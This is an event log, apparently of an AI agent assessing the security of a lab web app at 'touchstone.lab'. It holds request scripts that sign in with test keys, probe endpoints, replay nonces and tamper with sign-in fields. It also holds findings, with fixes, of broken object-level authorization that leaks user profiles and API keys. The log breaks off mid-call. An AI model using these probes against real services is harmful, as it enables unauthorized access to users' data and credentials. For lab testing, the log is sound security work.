{"t":1794345051703,"ev":"settled","status":"done","summary":{"calls":[{"name":"run_request_script","args":{"label":"recon-1","script":"const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst B = \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\";\nconst BK = \"0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690\";\nasync function login(addr, key) {\n  const n = await request(\"GET\", \"/siwe/nonce\");\n  const nonce = JSON.parse(n.resBody).nonce;\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: addr, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\n  const sig = await signPersonal(key, msg);\n  const v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\n  return JSON.parse(v.resBody);\n}\nconst a = await login(A, AK);\nconst b = await login(B, BK);\nconst at = { authorization: \"Bearer \" + a.token };\nconst out = { aliceTok: a.token, bobTok: b.token, aliceUser: a.user, bobUser: b.user };\nout.meA = await request(\"GET\", \"/api/me\", { headers: at });\nout.u1 = await request(\"GET\", \"/api/users/1\", { headers: at });\nout.u2 = await request(\"GET\", \"/api/users/2\", { headers: at });\nout.w2 = await request(\"GET\", \"/api/users/2/wallet\", { headers: at });\nout.w1 = await request(\"GET\", \"/api/users/1/wallet\", { headers: at });\nconst probes = [\"/openapi.json\",\"/api/users\",\"/api/admin\",\"/api/health\",\"/health\",\"/api/keys\",\"/api/me/wallet\",\"/api/tokens\",\"/debug\",\"/api/debug\",\"/siwe/token\",\"/api/sessions\",\"/api/config\",\"/status\"];\nout.probes = {};\nfor (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { status: r.status, body: String(r.resBody).slice(0,200) }; }\nreturn out;"}},{"name":"run_request_script","args":{"label":"recon-2","script":"const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst B = \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\";\nconst BK = \"0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nasync function login(addr, key) {\n  const n = await request(\"GET\", \"/siwe/nonce\");\n  const nonce = J(n.resBody).nonce;\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: addr, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\n  const sig = await signPersonal(key, msg);\n  const v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\n  return { status: v.status, data: J(v.resBody) };\n}\nconst a = await login(A, AK);\nconst b = await login(B, BK);\nconst out = { aStatus: a.status, bStatus: b.status, aliceTok: a.data.token, bobTok: b.data.token, aliceUser: a.data.user, bobUser: b.data.user };\nif (!a.data.token) return out;\nconst at = { authorization: \"Bearer \" + a.data.token };\nout.meA = (await request(\"GET\", \"/api/me\", { headers: at })).resBody;\nout.u1 = (await request(\"GET\", \"/api/users/1\", { headers: at })).resBody;\nout.u2 = (await request(\"GET\", \"/api/users/2\", { headers: at })).resBody;\nout.w2 = (await request(\"GET\", \"/api/users/2/wallet\", { headers: at })).resBody;\nout.w1 = (await request(\"GET\", \"/api/users/1/wallet\", { headers: at })).resBody;\nconst probes = [\"/openapi.json\",\"/api/users\",\"/api/admin\",\"/api/health\",\"/health\",\"/api/keys\",\"/api/me/wallet\",\"/api/tokens\",\"/debug\",\"/api/debug\",\"/siwe/token\",\"/api/sessions\",\"/api/config\",\"/status\"];\nout.probes = {};\nfor (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { s: r.status, b: String(r.resBody).slice(0,160) }; }\nreturn out;"}},{"name":"run_request_script","args":{"label":"recon-3","script":"const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst B = \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nasync function login(addr, key) {\n  const n = await request(\"GET\", \"/siwe/nonce\");\n  const nonce = J(n.resBody).nonce;\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: addr, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\n  const sig = await signPersonal(key, msg);\n  const v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\n  return { s: v.status, d: J(v.resBody) };\n}\nconst a = await login(A, AK);\nconst at = { authorization: \"Bearer \" + a.d.token };\nconst out = {};\nout.a = a;\nconst cands = [\"0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b786900\",\n               \"0x059c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690\"];\nout.bobs = [];\nfor (const k of cands) {\n  try { const r = await login(B, k); out.bobs.push({ k, s: r.s, u: r.d.user, tok: r.d.token }); } catch (e) { out.bobs.push({ k, err: String(e).slice(0,80) }); }\n}\nout.meA = (await request(\"GET\", \"/api/me\", { headers: at })).resBody;\nout.u2 = (await request(\"GET\", \"/api/users/2\", { headers: at })).resBody;\nout.w1 = (await request(\"GET\", \"/api/users/1/wallet\", { headers: at })).resBody;\nout.w2 = (await request(\"GET\", \"/api/users/2/wallet\", { headers: at })).resBody;\nconst probes = [\"/openapi.json\",\"/api/users\",\"/api/admin\",\"/health\",\"/api/keys\",\"/api/me/wallet\",\"/api/tokens\",\"/debug\",\"/api/config\",\"/status\"];\nout.probes = {};\nfor (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { s: r.status, b: String(r.resBody).slice(0,160) }; }\nreturn out;"}},{"name":"submit_finding","args":{"title":"Broken object level authorization on /api/users/{id}: any session reads any user's profile","severity":"high","label":"recon-3","explanation":"I signed in as alice (user id 1) and got a normal bearer token. Then I called `GET /api/users/2` with alice's token. The server sent back bob's private profile: his name, his e-mail `bob@touchstone.lab`, his wallet address, and his balance.\n\nThe server only checks that *some* session exists. It never checks that the session owns the `id` in the path. So one account can walk id 1, 2, 3... and read everybody's data with no other help.\n\n```js\nconst a = await login(alice);                     // token for user 1\nawait request(\"GET\", \"/api/users/2\", { headers: { authorization: \"Bearer \" + a.token } });\n// 200 {\"id\":2,\"name\":\"bob\",\"email\":\"bob@touchstone.lab\",\"balanceUsd\":900}\n```\n\nFix: in the `/api/users/{id}` handler, compare the path `id` with the session user id. Return 403 when they differ, or return only the fields that are public."}},{"name":"run_request_script","args":{"label":"wallet-idor-isolated","script":"const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: J(n.resBody).nonce, issuedAt: new Date().toISOString() });\nconst sig = await signPersonal(AK, msg);\nconst v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\nconst tok = J(v.resBody).token;\nconst r = await request(\"GET\", \"/api/users/2/wallet\", { headers: { authorization: \"Bearer \" + tok } });\nreturn { me: J(v.resBody).user, bobWallet: r.resBody };"}},{"name":"submit_finding","args":{"title":"/api/users/{id}/wallet leaks another user's API key to any session","severity":"high","label":"wallet-idor-isolated","explanation":"The wallet route has the same missing check as the profile route. A session for user 1 can ask for user 2's wallet and gets bob's `apiKey` back. An API key is a credential. So a single alice session also collects bob's key material, not only his e-mail.\n\n```js\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: alice, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: (await ...).nonce, issuedAt: new Date().toISOString() });\n// ... verify -> alice token ...\nawait request(\"GET\", \"/api/users/2/wallet\", { headers: { authorization: \"Bearer \" + aliceToken } });\n// 200 {\"id\":2,\"wallet\":\"0x7099...79C8\",\"apiKey\":\"tk_bob_77ab0e31\"}\n```\n\nNote that the key itself is guessable: `tk_bob_` + 8 hex chars. That makes the leak worse, because a stolen or guessed key is easy to read back.\n\nFix: in the `/api/users/{id}/wallet` handler, compare the path `id` with the session user id, or split the route into `/api/me/wallet` and a public route that hides `apiKey`."}},{"name":"run_request_script","args":{"label":"replay-1","script":"const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst nonce = J(n.resBody).nonce;\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\nconst sig = await signPersonal(AK, msg);\nconst body = JSON.stringify({ message: msg, signature: sig });\nconst h = { \"content-type\": \"application/json\" };\nconst v1 = await request(\"POST\", \"/siwe/verify\", { headers: h, body });\nconst v2 = await request(\"POST\", \"/siwe/verify\", { headers: h, body });\nawait request(\"GET\", \"/siwe/nonce\");\nconst v3 = await request(\"POST\", \"/siwe/verify\", { headers: h, body });\nreturn { nonce, v1: { s: v1.status, b: J(v1.resBody) }, v2: { s: v2.status, b: J(v2.resBody) }, v3: { s: v3.status, b: J(v3.resBody) } };"}},{"name":"run_request_script","args":{"label":"siwe-fields-1","script":"const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst h = { \"content-type\": \"application/json\" };\nconst out = {};\nasync function tryVerify(tag, fields) {\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, issuedAt: new Date().toISOString(), ...fields });\n  const sig = await signPersonal(AK, msg);\n  const r = await request(\"POST\", \"/siwe/verify\", { headers: h, body: JSON.stringify({ message: msg, signature: sig }) });\n  out[tag] = { s: r.status, b: J(r.resBody) };\n}\nconst fresh = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nawait tryVerify(\"inventedNonce\", { nonce: \"deadbeefdeadbeef\" });\nawait tryVerify(\"evildomain\", { nonce: fresh, domain: \"evil.lab\" });\nconst fresh2 = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nawait tryVerify(\"eviluri\", { nonce: fresh2, uri: \"http://evil.lab/x\" });\nconst fresh3 = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nawait tryVerify(\"wrongchain\", { nonce: fresh3, chainId: 1 });\nconst fresh4 = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nawait tryVerify(\"oldIssuedAt\", { nonce: fresh4, issuedAt: \"2020-01-01T00:00:00.000Z\" });\nreturn out;"}},{"name":"run_request_script","args":{"label":"nonce-reuse-1","script":"const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst h = { \"content-type\": \"application/json\" };\nconst out = {};\nconst nonce = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nfor (let i = 0; i < 2; i++) {\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date(Date.now() + i * 1000).toISOString() });\n  const sig = await signPersonal(AK, msg);\n  const r = await request(\"POST\", \"/siwe/verify\", { headers: h, body: JSON.stringify({ message: msg, signature: sig }) });\n  out[\"nonceReuse\" + i] = { s: r.status, b: J(r.resBody) };\n}\nconst tok = out.nonceReuse0.b && out.nonceReuse0.b.token;\nout.unauth = {};\nfor (const p of [\"/api/me\", \"/api/users/1\", \"/api/users/1/wallet\"]) {\n  const r = await request(\"GET\", p); out.unauth[p] = { s: r.status, b: String(r.resBody).slice(0, 120) };\n}\nout.badToken = (await request(\"GET\", \"/api/me\", { headers: { authorization: \"Bearer nope\" } })).status;\nif (tok) {\n  const at = { authorization: \"Bearer \" + tok };\n  const probes = [\"/api/users/1/sessions\",\"/api/sessions\",\"/api/me/sessions\",\"/api/apikey\",\"/api/users/1/apikey\",\"/api/wallet\",\"/api/transactions\",\"/api/users/1/transactions\",\"/api/export\",\"/metrics\",\"/api/v1/users/1\",\"/v1/users/1\",\"/api/internal\",\"/api/users/1/key\",\"/api/users/1/privatekey\",\"/nonce\",\"/api/nonce\",\"/api/admin/users\"];\n  out.probes = {};\n  for (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { s: r.status, b: String(r.resBody).slice(0, 110) }; }\n}\nreturn out;"}},{"name":"run_request_script","args":{"label":"enum-2","script":